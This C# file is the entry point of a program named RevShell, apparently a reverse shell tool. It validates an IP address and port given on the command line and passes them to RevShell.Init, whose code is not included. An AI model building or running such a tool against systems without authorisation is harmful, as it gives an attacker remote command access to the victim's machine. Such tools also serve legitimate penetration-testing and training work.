using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

namespace RevShell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if(args.Length == 2)
            { 
                String ip = args[0];
                String port = args[1];

                string ipv4Pattern = @"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
                string portPattern = @"^(?:[1-9]\d{0,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])$";

                bool parseIp = Regex.IsMatch(ip, ipv4Pattern);
                bool parsePort = Regex.IsMatch(port, portPattern);

                if (parseIp && parsePort)
                    RevShell.Init(ip, Int32.Parse(port));
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    if (!parseIp)
                        Console.WriteLine("IP does not have valid format");
                    if (!parsePort)
                        Console.WriteLine("Port is not a valid Number");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Specify args params");
                Console.WriteLine("Example: RevShell <IP> <PORT>");
                Console.ResetColor();
            }
        }
    }
}
